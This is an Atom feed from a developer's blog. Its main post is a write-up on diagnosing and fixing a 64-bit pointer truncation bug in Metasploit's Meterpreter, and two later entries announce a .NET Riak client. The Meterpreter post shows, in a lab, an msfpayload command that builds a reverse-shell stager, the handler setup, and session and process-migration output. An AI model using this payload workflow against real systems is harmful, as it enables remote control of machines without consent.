<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Open Source | OJ's perspective]]></title>
  <link href="http://buffered.io/categories/open-source/atom.xml" rel="self"/>
  <link href="http://buffered.io/"/>
  <updated>2013-12-25T21:15:26+10:00</updated>
  <id>http://buffered.io/</id>
  <author>
    <name><![CDATA[OJ Reeves]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[64bit Pointer Truncation in Meterpreter]]></title>
    <link href="http://buffered.io/posts/64bit-pointer-truncation-in-meterpreter/"/>
    <updated>2013-09-14T07:25:00+10:00</updated>
    <id>http://buffered.io/posts/64bit-pointer-truncation-in-meterpreter</id>
    <content type="html"><![CDATA[<p>If you haven&rsquo;t ever heard of <a href="https://github.com/rapid7/meterpreter" title="Native Meterpreter">Meterpreter</a> before, you might want to go and take a look at it before reading this post to help give some context. In short, Meterpreter is an amazing library that is part of the <a href="http://www.metasploit.com/" title="Metasploit Framework">Metasploit Framework</a> and can be used to give you tremendous power and control over target machines during a <a href="http://en.wikipedia.org/wiki/Penetration_test" title="Penetration Testing">penetration test</a>. Anyone and everyone in the security game is most likely familiar with both Metasploit and Meterpreter, at the very least, if not closely intimate with them. The toolset is fantastic, and is <a href="https://github.com/rapid7/metasploit-framework/" title="Metasploit Framework Source">open source</a>!</p>

<p>I&rsquo;m currently in the very fortunate position of <a href="https://community.rapid7.com/community/metasploit/blog/2013/09/05/weekly-update" title="Weekly Update: Meterpreter Updates, VMWare, the OSX spycam, Retabbing, and more!">working with the crew</a> from <a href="http://www.rapid7.com/" title="Rapid 7">Rapid7</a> to help improve Meterpreter, particularly on the Windows (both 32 and 64 bit). I have a good list of things to work through while I&rsquo;m on board including making it easier to build for potential contributors, and to fix some outstanding issues that the R7 crew haven&rsquo;t had the bandwidth to fix.  These people are super-smart, and super-nice and I&rsquo;m honoured that I&rsquo;ve been selected to work alongside them.</p>

<p>The purpose of this post is to document the process and resolution of a bug that I have helped resolve since joining. I also aim to lift the lid on Meterpreter a little and help expose how some bits of it work. I hope you enjoy.</p>

<!--more-->


<h2>Meterpreter Basics</h2>

<p>When exploiting a vulnerability during a penetration test using Metasploit, you have a number of payloads that you choose to use which give you some sort of control over your target. Of those payloads, Metepreter is not only the most common, but is probably the most powerful.</p>

<p>Once you have an instance of Metepreter running on a target, you&rsquo;ve got quite a lot of control. You can escalate privileges, dump password hashes, launch processes, upload files, and you can even use it as a pivot-point for launching attacks against other non-routable hosts. While the power of all this is enough to bake anyone&rsquo;s noodle, the thing that blows my mind the most is Meterpreter&rsquo;s ability to migrate to other processes. That is, Meterpreter can dynamically load itself into another processes and then reconnect to your Metasploit session seamlessly without any effort from the attacker (ie. you). Simply executing <code>migrate &lt;process id&gt;</code> at the Meterpreter prompt is all it takes.</p>

<p>There are some caveats when it comes to migration. In particular, you need to have permission to write to the target process&rsquo;s memory otherwise the migration will not succeed.</p>

<p>Meterpreter comes in quite a few flavours, including <code>PHP</code>, <code>Python</code>, and <code>native/C</code> for Linux and Windows. Some implementations are more feature-rich than others, but they all have common functionality which makes it easy to perform a variety of functions on a compromised host.</p>

<p>We&rsquo;ll be focusing on the Windows native payload in this post, and in particular we&rsquo;ll be looking at how Meterpreter is loaded and executed.</p>

<h2>Reflective DLL Injection</h2>

<p>Simply put, Reflective DLL Injection is a method for injection a DLL into a process. No surprises there. However, it has some nifty properties that make a great candidate for use in tools such as Meterpreter. Some of those points include:</p>

<ul>
<li>Position-independence.</li>
<li>Lack of host system registration.</li>
<li>Largely undetectable on the target at both a system and process level.</li>
</ul>


<p>The canonical paper [<a href="http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf" title="Reflective DLL Injection">PDF</a>], written by <a href="http://twitter.com/stephenfewer">Stephen Fewer</a>, is well worth reading and can be found on the <a href="http://harmonysecurity.com/" title="Harmony Security">Harmony Security</a> website. Read it. It&rsquo;s amazing, and does a much better job of explaining itself than I could ever hope to. I would like to point out that there&rsquo;s a multi-stage process involved which includes:</p>

<ul>
<li>Writing the code to an executable area of memory.</li>
<li>Executing the loader which creates a valid DLL image in memory.</li>
<li>Calling <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682583(v=vs.85).aspx" title="DllMain Entry Point">DllMain</a> on the loaded DLL.</li>
<li>Returning control to the process that invoked it.</li>
</ul>


<p>With that in mind, let&rsquo;s take a look at the bug.</p>

<h2>The Bug</h2>

<p>The bug that was reported related to process migration, and went something like this (paraphrased slightly with a bit more information):</p>

<blockquote><p>Trying to migrate Metepreter between processes on Windows 2012 seems to be
unreliable. It will migrate just fine into some processes, such as <em>explorer.exe</em>,
without any problems. However, spawning another process, such as <em>notepad.exe</em>, and
migrating to it hangs the entire session. Migrating to the <em>winlogon.exe</em> process
crashes the entire user environment on the target host.</p></blockquote>

<p>When I first read this report I thought &ldquo;Wow, how am I going to track this down?&rdquo;, and I&rsquo;ll admit that I was a little intimidated at first, especially given that I knew that the native Windows Meterpreter was using Reflective DLL Injection to load itself into other processes. However, it&rsquo;s been a long time since I&rsquo;d been tasked with something this challenging and so, deep down, I was looking forward to diving in.</p>

<h2>Replication</h2>

<p>The first step was to fire up a Windows 2012 virtual machine and replicate the problem. Windows 2012 only comes in a 64-bit flavour, so picking the right version wasn&rsquo;t a problem.</p>

<p>After installation, I needed to simulate an attack coming from Metasploit so that I could interact with Meterpreter to perform the migration.</p>

<p>Creating a payload to do this is really simple thanks to <a href="http://www.offensive-security.com/metasploit-unleashed/Msfpayload" title="msfpayload">msfpayload</a> (part of Metasploit). On my <a href="http://www.backtrack-linux.org/" title="Backtrack Linux">Backtrack</a> VM I used the following command to generate the PE image:</p>

<pre><code>root@bt:~# msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.5.26.40 LPORT=443 X &gt; 40-443-x64.exe
</code></pre>

<p>This command creates a 64-bit Windows executable that contains a small stager. This stager connects to <code>10.5.26.40</code> (my Backtrack VM) on port <code>443</code> (I always choose the HTTPS port to avoid potential outbound firewall issues). Once connected it will download the Meterpreter payload and establish a session with Metasploit.</p>

<p>I copied this binary to the Windows 2012 machine ready to execute. At this point, Metasploit needs to be set up and configured to deal with the incoming request. On the Backtrack VM, we run <code>msfconsole</code> and set it up to use <code>multi/handler</code> with the appropriate settings, like so:</p>

<pre><code>msf exploit(handler) &gt; show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique: seh, thread, process, none
   LHOST     10.5.26.40       yes       The listen address
   LPORT     443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
</code></pre>

<p>With those settings in place, the exploit was ready to fire:</p>

<pre><code>msf exploit(handler) &gt; exploit

[*] Started reverse handler on 10.5.26.40:443 
[*] Starting the payload handler...
</code></pre>

<p>From the Windows 2012 VM I ran the exploit binary and my Metepreter session kicked off:</p>

<pre><code>[*] Sending stage (951296 bytes) to 10.5.26.30
[*] Meterpreter session 1 opened (10.5.26.40:443 -&gt; 10.5.26.30:38516) at 2013-09-11 21:55:52 +1000

meterpreter &gt; getuid
Server username: WIN-URCAUVPE291\OJ Reeves
meterpreter &gt; sysinfo
Computer        : WIN-URCAUVPE291
OS              : Windows 2012 (Build 9200).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/win64
meterpreter &gt; 
</code></pre>

<p>Before trying the failure case, I wanted to make sure that the known success case worked locally first. I decided to migrate to <code>explorer.exe</code> and see if anything changed:</p>

<pre><code>meterpreter &gt; ps

Process List
============

 PID   PPID  Name                Arch    Session     User                       Path
 ---   ----  ----                ----    -------     ----                       ----
 0     0     [System Process]            4294967295                             
 4     0     System                      4294967295                             
 444   4     smss.exe                    4294967295                             
 484   708   svchost.exe                 4294967295                             
 536   524   csrss.exe                   4294967295                             
 604   596   csrss.exe                   4294967295                             
 612   524   wininit.exe                 4294967295                             
 640   596   winlogon.exe                4294967295                             
 692   720   explorer.exe        x86_64  1           WIN-URCAUVPE291\OJ Reeves  C:\Windows\Explorer.EXE
 708   612   services.exe                4294967295                             
 716   612   lsass.exe                   4294967295                             
 804   708   svchost.exe                 4294967295                             
 816   708   svchost.exe                 4294967295                             

... snip ...

meterpreter &gt; migrate 692
[*] Migrating from 1508 to 692...
[*] Migration completed successfully.
meterpreter &gt; getuid
Server username: WIN-URCAUVPE291\OJ Reeves
meterpreter &gt; sysinfo
Computer        : WIN-URCAUVPE291
OS              : Windows 2012 (Build 9200).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/win64
meterpreter &gt; 
</code></pre>

<p>Migration seemed to work. Next I tried the failure case. First I launched <code>notepad.exe</code> and then attempted to migrate to it:</p>

<pre><code>meterpreter &gt; execute -f notepad.exe -t -H
Process 192 created.
meterpreter &gt; migrate 192
[*] Migrating from 692 to 192...
[-] Error running command migrate: Rex::RuntimeError No response was received to the core_loadlib request.
meterpreter &gt;
</code></pre>

<p>The session hung at this point and no Meterpreter commands would work. When I went over to the Windows 2012 VM I saw that there was a notification that the notepad.exe process had crashed. This was great as I was able to reproduce the failure. It was time to investigate the problem.</p>

<h2>Diagnosis</h2>

<p>To help figure out what was going wrong, I enlisted the help of two of my favourite tools: <a href="http://technet.microsoft.com/en-au/sysinternals/bb896647.aspx" title="DebugView">DebugView</a> and <a href="http://en.wikipedia.org/wiki/WinDbg" title="Windbg">Windbg</a>. Coverage of these tools is beyond the scope of the article, so if you want to learn more about them you&rsquo;ll find a stack of information out on the web. Given that this machine was 64-bit and the process we were aiming to debug was 64-bit, I installed the 64-bit version of the <a href="http://msdn.microsoft.com/en-us/windows/hardware/gg463009.aspx" title="Debugging Tools for Windows">Debugging Tools for Windows</a> so that the right version of <code>windbg</code> was available.</p>

<p>Before dabbling with any of the binaries and adding debug detail, I repeated the failure scenario but with one small change: I launched <code>notepad.exe</code> manually and attached to it from <code>windbg</code> prior to performing the migration. I left <code>DebugView</code> running as well to catch any debug messages from processes outside of the one that <code>windbg</code> was attached to.</p>

<p>Upon running the <code>migrate</code> command <code>notepad.exe</code> crashed and <code>windbg</code> caught the exception. This is what it showed:</p>

<pre><code>(ab0.448): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
00000000`707a7b5c ??              ???
</code></pre>

<p>We can see that we&rsquo;re accessing memory that we shouldn&rsquo;t be accessing. But why?</p>

<pre><code>0:003&gt; !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************


FAULTING_IP: 
unknown!printable+0
00000000`707a7b5c ??              ???

EXCEPTION_RECORD:  ffffffffffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 00000000707a7b5c
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 0000000000000008
   Parameter[1]: 00000000707a7b5c
Attempt to execute non-executable address 00000000707a7b5c

... snip ...
</code></pre>

<p>The migration process results in an attempt to execute a section of code in an area of memory that isn&rsquo;t marked as executable. Let&rsquo;s confirm that:</p>

<pre><code>0:003&gt; !vprot 00000000707a7b5c
BaseAddress:       00000000707a7000
AllocationBase:    0000000000000000
RegionSize:        000000000f839000
State:             00010000  MEM_FREE
Protect:           00000001  PAGE_NOACCESS
</code></pre>

<p>As we can see the memory area is definitely not marked as executable. But should it be? Should this memory be executable, or are we just pointing to an invalid area of memory? If it was the former, then it might imply that DEP or ASLR are somehow interfering. However, my gut feeling was that it was the latter. A quick look at the contents of the memory at this location would be enough to confirm:</p>

<pre><code>0:003&gt; du 00000000707a7b5c
00000000`707a7b5c  "????????????????????????????????"
00000000`707a7b9c  "????????????????????????????????"
00000000`707a7bdc  "????????????????????????????????"
00000000`707a7c1c  "????????????????????????????????"
00000000`707a7c5c  "????????????????????????????????"
00000000`707a7c9c  "????????????????????????????????"
00000000`707a7cdc  "????????????????????????????????"
00000000`707a7d1c  "????????????????????????????????"
00000000`707a7d5c  "????????????????????????????????"
00000000`707a7d9c  "????????????????????????????????"
00000000`707a7ddc  "????????????????????????????????"
00000000`707a7e1c  "????????????????????????????????"
</code></pre>

<p>It&rsquo;s pretty clear that no valid code is located in this area of memory. This implied that there was a possibility that a pointer to an area of code is somehow going awry. But where? To find this out, I needed to add some more debug output to Meterpreter.</p>

<p>Next, I opened the Meterpreter source in Visual Studio 2012 (freshly moved from VS 2010 by yours truly) and prepared to rebuild the binaries with some extra debug output. I littered the code with <a href="http://msdn.microsoft.com/en-us/library/windows/apps/aa363362(v=vs.85).aspx" title="OutputDebugString function">OutputDebugString</a> calls at various key locations, enabled the existing logging that was built into the source, and rebuilt the suite of binaries from scratch. Once built, I deployed them to my Backtrack VM, fired up <code>DebugView</code> on the Windows 2012 VM and repeated the process (including attaching to <code>notepad.exe</code> with <code>windbg</code>). Here&rsquo;s a snippet of the output:</p>

<pre><code>[SERVER] Initializing...
[SERVER] module loaded at 0x350B0000
[SERVER] main server thread: handle=0x00000138 id=0x000008F0 sigterm=0x334D7B20
[SERVER] Using SSL transport...
[SERVER] Initializing tokens...
[SERVER] Flushing the socket handle...
[SERVER] Initializing SSL...
[SERVER] Negotiating SSL...
ModLoad: 000007ff`58060000 000007ff`58075000   C:\Windows\system32\NETAPI32.DLL
ModLoad: 000007ff`586d0000 000007ff`586de000   C:\Windows\system32\netutils.dll
ModLoad: 000007ff`5b020000 000007ff`5b044000   C:\Windows\system32\srvcli.dll
ModLoad: 000007ff`58020000 000007ff`58035000   C:\Windows\system32\wkscli.dll
ModLoad: 000007ff`5ad10000 000007ff`5ad2a000   C:\Windows\system32\CRYPTSP.dll
ModLoad: 000007ff`5a990000 000007ff`5a9d9000   C:\Windows\system32\rsaenh.dll
[SERVER] Sending a HTTP GET request to the remote side...
[SERVER] Completed writing the HTTP GET request: 27
[SERVER] Registering dispatch routines...
Registering a new command (core_loadlib)...
Allocated memory...
Setting new command...
Fixing next/prev...
Done...
[SERVER] Entering the main server dispatch loop for transport 0...
[DISPATCH] entering server_dispatch( 0x334D7B60 )
[SCHEDULER] entering scheduler_initialize.
[SCHEDULER] leaving scheduler_initialize.
[DISPATCH] created command_process_thread 0x33523030, handle=0x000001F0
[COMMAND] Processing method core_loadlib
[COMMAND] core_loadlib: Entry
[COMMAND] core_loadlib: libraryPath (ext264209.x64.dll) flags (2)
[COMMAND] core_loadlib: lib does not exist locally (being uploaded)
[COMMAND] core_loadlib: lib is not to be stored on disk
[LOADLIBRARYR] starting
[LOADLIBRARYR] GetReflectiveLoaderOffset
[LOADLIBRARYR] GetReflectiveLoaderOffset (5488)
[LOADLIBRARYR] Calling VirtualProtect lpBuffer (0000008935318B20) length (428544)
[LOADLIBRARYR] Calling pReflectiveLoader (000000893531A090)
ModLoad: 000007ff`555e0000 000007ff`55600000   C:\Windows\system32\WINMM.dll
ModLoad: 000007ff`555a0000 000007ff`555d2000   C:\Windows\system32\WINMMBASE.dll
ModLoad: 000007ff`57e00000 000007ff`57e2c000   C:\Windows\system32\IPHLPAPI.DLL
ModLoad: 000007ff`57de0000 000007ff`57dea000   C:\Windows\system32\WINNSI.DLL
[LOADLIBRARYR] Calling pDllMain (0000000033449BEC)
(9b8.968): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
00000000`33449bec ??              ???
</code></pre>

<p>The extra debug calls that I added to the source are those marked with <code>[LOADLIBRARYR]</code>. These calls were located in the guts of the reflective DLL injection code.</p>

<p>As we already know from earlier in this post, the reflective DLL injection code dynamically builds a valid DLL image in memory and then invokes it. The method which builds this DLL image is called <code>ReflectiveLoader()</code> and is invoked in code via a pointer called <code>pReflectiveLoader</code>, which you can see in the above output. At the end of the <code>ReflectiveLoader()</code> function, a reference to <code>DllMain()</code> is resolved and invoked directly prior to returning control to the caller.</p>

<p>Once this function returns, the Meterpreter-specific code then calls <code>DllMain()</code> again, using the value returned from <code>ReflectiveLoader()</code>, to invoke some functionality required by the Metasploit framework. In the above output, you can see the pointer to <code>DllMain()</code> called <code>pDllMain</code>, and this is the pointer that&rsquo;s used to make the call.</p>

<p>What was interesting about the log is that the first call to <code>DllMain()</code> that is invoked in the body of <code>ReflectiveLoader()</code> worked fine, otherwise the process would have crashed prior to the line that outputs the value of the <code>pDllMain</code> variable. Instead, it was the <em>second</em> call to <code>DllMain()</code> via the <code>pDllMain</code> pointer that caused the crash. This implied that the memory address that was being returned from <code>ReflectiveLoader()</code> was incorrect.</p>

<p>The nature of the reflective loading mechanism implied to me that the addresses of <code>pReflectiveLoader</code> and <code>pDllMain</code> should actually be quite close together in memory. However, focussing on a small part of the output, I noticed the following:</p>

<pre><code>[LOADLIBRARYR] Calling pReflectiveLoader (000000893531A090)
[LOADLIBRARYR] Calling pDllMain          (0000000033449BEC)
</code></pre>

<p>Those two pointers were nowhere near each other! The more perceptive of you will have noticed that the <code>pDllMain</code> pointer appeared to have lost its higher-order <a href="http://msdn.microsoft.com/en-us/library/cc230318.aspx" title="DWORD">DWORD</a>. The pointer had in fact been truncated!</p>

<p>But why? It wasn&rsquo;t immediately obvious to me what the reason was, but I was keen to validate that this was the case. To prove my theory, I hacked the code a little so that the higher-order DWORD of the <code>pReflectiveLoader</code> value was used as the higher-order DWORD of <code>pDllMain</code> as well. The hack looked something like this:</p>

<p>{% codeblock lang:c %}
ULONG_PTR ulReflectiveLoaderBase = ((ULONG_PTR)pReflectiveLoader) &amp; (((ULONG_PTR)-1) ^ (0xFFFFFFFF));
pDllMain = (DLLMAIN)(pReflectiveLoader() | ulReflectiveLoaderBase);
{% endcodeblock %}</p>

<p>After the above code, <code>pDllMain</code> would have the same higher-order DWORD value as <code>pReflectiveLoader</code>. I compiled, deployed, executed &hellip;</p>

<p>&hellip; and it worked!</p>

<h2>Resolution</h2>

<p>Armed with the knowledge earned from the above diagnosis, I set about looking through the code to see why this pointer was being truncated. Clearly the value was perfectly fine prior to being returned from <code>ReflectiveLoader()</code>, so why was it truncated upon return?</p>

<p>I spent quite a bit of time looking around, and I didn&rsquo;t find anything. Nothing was leaping out at me. I felt really stupid. So instead of beating about the bush, I contacted the man himself, the author and creator of Reflective DLL Injection himself, Mr <a href="http://twitter.com/stephenfewer">Stephen Fewer</a>. I explained the situation to him, detailed my findings and asked if he any idea as to why this problem might be occurring.</p>

<p>It didn&rsquo;t take long to get a response. Stephen jumped on the issue straight away, fixed it and submitted a <a href="https://github.com/rapid7/meterpreter/pull/14">pull request</a> to the Meterpreter repository before emailing me back with details of the solution. Talk about great service!</p>

<p>When I saw the solution I immediately felt stupid for missing it myself. In hindsight I should have known to look in this location. I ate some humble pie and savoured the taste while expressing my gratitude to Stephen for his prompt response.</p>

<p>So what was it?</p>

<p>The <code>pReflectiveLoader</code> pointer is a function pointer of a type defined like so:</p>

<p>{% codeblock lang:c %}
typedef DWORD (WINAPI * REFLECTIVELOADER)( VOID );
{% endcodeblock %}</p>

<p>However, the <code>ReflectiveLoader()</code> function was defined in the source like so:</p>

<p>{% codeblock lang:c %}</p>

<h1>ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR</h1>

<p>DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )</p>

<h1>else</h1>

<p>DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )</p>

<h1>endif</h1>

<p>{</p>

<pre><code>// ... snip ...
</code></pre>

<p>}
{% endcodeblock %}</p>

<p>So the function returns a <a href="http://msdn.microsoft.com/en-us/library/cc230394.aspx" title="ULONG_PTR">ULONG_PTR</a> (which is 64-bits) but the function pointer type returned a <a href="http://msdn.microsoft.com/en-us/library/cc230318.aspx" title="DWORD">DWORD</a> (which is 32-bits). This is what was causing the truncation of the pointer and effectively zeroing out the higher-order DWORD of <code>pDllMain</code>. The fix was to simply change the return type of the function pointer to match:</p>

<p>{% codeblock lang:c %}
typedef ULONG_PTR (WINAPI * REFLECTIVELOADER)( VOID );
{% endcodeblock %}</p>

<p>Problem solved.</p>

<h2>Extra Thoughts and Conclusion</h2>

<p>For those of you who are wondering, like I was, why this was an intermittent problem the answer lies in the fact that the new versions of Windows have newer versions of <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization" title="Adress Space Layout Randomisation">ASLR</a>. To quote Stephen:</p>

<blockquote><p>The bug was triggering on Server 2012 but not other 64bit systems
probably due to high entropy ASLR making allocations over the 4gig boundary.</p></blockquote>

<p>Earlier versions of Windows didn&rsquo;t have an ASLR implementation that resulted in memory allocations over the 4GB boundary. As a result, the higher-order DWORD was always zero anyway, which meant that the truncation had no impact.</p>

<p>This was a really fun bug to analyse and track down. I&rsquo;m glad we got to the bottom of it. Again I&rsquo;d like to thank Stephen for his involvement in locating the source of the problem.</p>

<p>The new and improved version of Meterpreter that contains this fix will be landing in Metasploit very soon (I hope). Thanks for reading. Comments and feedback are welcomed.  <a name="Edit15thSep"></a></p>

<h2>Edit 15th September</h2>

<p>Today on Twitter <a href="https://twitter.com/KronicDeth" title="Luke Imhoff @ Twitter">Luke Imhoff</a> asked me a good question:</p>

<blockquote class="twitter-tweet"><p><a href="https://twitter.com/TheColonial">@TheColonial</a> why didn&#39;t the compiler issue a truncation warning?</p>&mdash; Luke Imhoff (@KronicDeth) <a href="https://twitter.com/KronicDeth/statuses/378878334249095168">September 14, 2013</a></blockquote>


<script async src="http://buffered.io//platform.twitter.com/widgets.js" charset="utf-8"></script>


<p>I answered quickly but realised after that I was a bit hasty, so I&rsquo;m going to clarify on here instead.</p>

<p>We need to review a few snippets of code to understand why the compiler didn&rsquo;t complain. Firstly, the function-pointer type definition (prior to the fix):</p>

<p>{% codeblock ReflectiveDllInjection.h (partial) lang:c %}
typedef DWORD (WINAPI * REFLECTIVELOADER)( VOID );
{% endcodeblock %}</p>

<p>Second, the declaration of the <code>ReflectiveLoader()</code> function:</p>

<p>{% codeblock ReflectiveLoader.c (partial) lang:c %}</p>

<h1>ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR</h1>

<p>DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )</p>

<h1>else</h1>

<p>DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )</p>

<h1>endif</h1>

<p>{
   // &hellip; snip &hellip;
}
{% endcodeblock %}</p>

<p>Third, the declaration of both <code>pDllMain</code> and <code>pReflectiveLoader</code>:</p>

<p>{% codeblock LoadLibraryR.c (partial) lang:c %}
REFLECTIVELOADER pReflectiveLoader = NULL;
DLLMAIN pDllMain                   = NULL;
{% endcodeblock %}</p>

<p>Finally, the actual calls that use these pointers:</p>

<p>{% codeblock LoadLibraryR.c (partial) lang:c %}
pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpBuffer + dwReflectiveLoaderOffset);
// &hellip; snip &hellip;
pDllMain = (DLLMAIN)pReflectiveLoader();
{% endcodeblock %}</p>

<p>As we can see, <code>pReflectiveLoader</code> is set via a cast from a <code>UINT_PTR</code> type, which maps to the right sized pointer for whatever platform it&rsquo;s compiled on. Casting a <code>UINT_PTR</code> to a <code>REFLECTIVELOADER</code> type doesn&rsquo;t change the size.</p>

<p>At first I though the reason there was no compiler warning was because the result of calling <code>pReflectiveLoader</code> was cast to a <code>DLLMAIN</code> type, effectively hiding the problem, but that&rsquo;s not correct. If <code>pDllMain</code> was just a <code>ULONG_PTR</code> instead of <code>DLLMAIN</code> and no casting was used it still wouldn&rsquo;t have resulted in a problem because the return type of <code>REFLECTIVELOADER</code> is <em>smaller</em>, and hence an implicit cast would have turned this into a 64-bit value without complaining. The truncation has already happened because of the incorrect return type of <code>REFLECTIVELOADER</code>.</p>

<p>Ultimately the problem is down to the disconnect between the function pointer type and the function implementation type.</p>

<p>Thanks for the great question Luke.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CorrugatedIron Update - v0.1.1]]></title>
    <link href="http://buffered.io/posts/corrugatediron-update-v0-1-1/"/>
    <updated>2011-08-03T21:18:00+10:00</updated>
    <id>http://buffered.io/posts/corrugatediron-update-v0-1-1</id>
    <content type="html"><![CDATA[<p>Last week <a href="http://facility9.com/" title="Jeremiah Peschka">JP</a> and I released our first Open Source project, <a href="http://corrugatediron.org/" title="CorrugatedIron">CorrugatedIron</a>. The release seemed to be fairly well received by those people who gave it a spin. We&rsquo;ve had some good feedback along the way which we&rsquo;ll be evaluating, and no doubt those suggestions and comments will be influencing the future of the library.</p>

<p>In the interim, we wanted to get another version out which sorts out two main issues and that changes the <em>perceived</em> &ldquo;norm&rdquo; when building applications with CorrugatedIron. Those issues are listed below. We&rsquo;ve also go the first pass of our <a href="http://corrugatediron.org/documentation/MapReduce.html" title="Map/Reduce">Map/Reduce</a> documentation ready.</p>

<p>If you&rsquo;re not interested in the detail, head on over to the <a href="http://corrugatediron.org/downloads.html" title="Downloads page">download page</a> to find out the many ways in which you can get access to the release. Otherwise, please read on!</p>

<!--more-->


<h2>Removal of IoC</h2>

<p>When we first put together the sample applications we thought that it&rsquo;d be a good idea to show how these things can be done using what the mainstream .NET developers would use. That is, we decided to wire everything in with IoC. This wasn&rsquo;t because we felt that this is how it <strong>had</strong> to be done, but more to try and give people a level of familiarity. The library that we chose to use for the samples was Unity, for no other reason that &ldquo;it was there&rdquo;.</p>

<p>This small mistake seemed to give off the impression that we felt that Unity was the best choice of all the IoC containers out there.</p>

<p>This is most definitely <strong>not the case</strong>. We are in no way advocating the use of one IoC container over the other. We honestly don&rsquo;t care which one you want to use. You should use whichever works for you.</p>

<p>To avoid this perception we decided that it would be best to remove references to any IoC container in all samples except for the <a href="https://github.com/DistributedNonsense/CorrugatedIron.Samples/tree/master/VisualStudio2010/Sample" title="IoC Sample Project">one sample</a> which shows how to use <em>lots</em> of different containers to do the same thing. Hence you should see a <em>lack</em> of IoC containers in our examples from now on. Sorry for any confusion.</p>

<h2>Handling of Client IDs</h2>

<p>Our first implementation of Client ID generation in CorrugatedIron wasn&rsquo;t a great implementation. We made the decision early on to generate IDs based on some details of the machine that the client was running on (ie. The MAC address of the first functioning NIC on the machine). Our thinking was that we wanted to uniquely identify a client while still allowing the ID to be reused across instances of the application. This might make sense for rich-client applications, but certainly doesn&rsquo;t work well in the web world. In a web environment, each request could come from a different user.</p>

<p>Almost immediately after releasing v0.1.0, <a href="http://facility9.com/" title="Jeremiah Peschka">JP</a> and I read an email on the [Riak mailing list][mailinglist] which made us rethink our approach. After a bit of discussion, we decided to go with an idea of Jeremiah&rsquo;s which involves the generation of the Client ID when the RiakClient instance is created. This generation can be controlled by the user of the library by specifying a <code>seed</code> value.</p>

<p>This gives the user the flexibility of not being concerned about the Client ID if they don&rsquo;t want to be, but can have some control if they do.</p>

<h2>Ease of Configuration</h2>

<p>The only bit of &ldquo;constructive criticism&rdquo; that we received on-masse was via <a href="http://news.ycombinator.com/item?id=2799823" title="CI on Hacker News">Hacker News</a> and revolved around configuration. The general feeling was that the effort required to configure the library was higher than expected, especially when compared to other libraries. I&rsquo;d suggest reading the full discussion over on the <a href="http://news.ycombinator.com/item?id=2799823" title="CI on Hacker News">Hacker News</a> site to read some of the reasons behind the design decisions. But, if you&rsquo;re too lazy (I don&rsquo;t blame you if you are), the short version is this: CorrugatedIron is a .NET library connecting to a clustered, distributed key-value store. A library that does this, while attempting to manage load-balancing across all nodes in the cluster, is going to require some configuration.</p>

<p>One concern in particular resonated with me, and that was the difficulty in getting CorrugatedIron running inside a REPL, such as <a href="http://www.fsharphelp.com/Interactive.aspx" title="F# interactive">FSI</a>. The two issues with getting a REPL to work from configuration are:</p>

<ul>
<li>The ability to specify the location of the configuration file.</li>
<li>The number of lines of code it takes to wire things in.</li>
</ul>


<p>The XML that&rsquo;s required is not going to be changing in the short term. The values that are specified in that configuration are required to make the most of Riak and that&rsquo;s not something we&rsquo;re prepared to compromise on. However, the .NET code required to access it has changed, though the old way of wiring things in still exists for those people who want that level of flexibility.</p>

<p>In short, you can wire-in CorrugatedIron&rsquo;s XML configuration as simply as:</p>

<p>{% codeblock lang:csharp %}
var cluster = RiakCluster.FromConfig(&ldquo;riakConfig&rdquo;);
var client = cluster.CreateClient();
{% endcodeblock %}</p>

<h2>That&rsquo;s it!</h2>

<p>Hopefully this will make your life a little easier while getting CorrugatedIron up and running. We&rsquo;re always keen to hear your feedback, so please <a href="https://github.com/DistributedNonsense/CorrugatedIron" title="CorrugatedIron @ Github">drop us a line</a> if you have any thoughts, suggestions or issues.</p>

<p>Enjoy!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Introducing CorrugatedIron]]></title>
    <link href="http://buffered.io/posts/introducing-corrugatediron/"/>
    <updated>2011-07-25T09:00:00+10:00</updated>
    <id>http://buffered.io/posts/introducing-corrugatediron</id>
    <content type="html"><![CDATA[<h2>It&rsquo;s Alive!</h2>

<p>It is with great pride that I introduce my first ever Open Source product release: <a href="http://corrugatediron.org/" title="CorrugatedIron">CorrugatedIron</a>! A feature-rich .NET client for the <a href="http://riak.basho.com/" title="Riak">Riak</a> Key-Value store. Together with my partner-in-crime <a href="http://facility9.com/" title="Jeremiah Peschka">Jeremiah</a>, we&rsquo;ve put together a driver which exposes a great deal of Riak&rsquo;s functionality. CorrugatedIron is at <a href="https://github.com/DistributedNonsense/CorrugatedIron/tree/v0.1.0">v0.1.0</a>, and while it doesn&rsquo;t support every feature the Riak has to offer, it covers most, if not all, of the most common features that are required to effectively communicate with the system.</p>

<!--more-->


<h2>Features</h2>

